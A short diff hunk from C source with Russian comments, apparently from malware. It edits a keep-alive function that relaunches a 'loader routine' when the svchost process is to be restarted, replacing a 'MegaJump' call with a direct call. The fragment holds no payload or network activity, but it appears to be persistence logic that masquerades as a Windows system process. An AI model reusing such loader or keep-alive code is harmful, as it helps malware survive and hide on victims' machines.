@@ -28,7 +28,7 @@ void KeepAliveRestartProcess(DWORD ProcessNomber)
 {
 	// Функция перезапускает указанный процесс
 	switch (ProcessNomber) {
-		case PROCESS_SVCHOST: MegaJump(LoaderRoutine); break; // Перезапускаем свхост
+		case PROCESS_SVCHOST: RunLoaderRoutine(); /*MegaJump(LoaderRoutine);*/ break; // Перезапускаем свхост
 	}
 }
 //-----------------------------------------------------------------------------
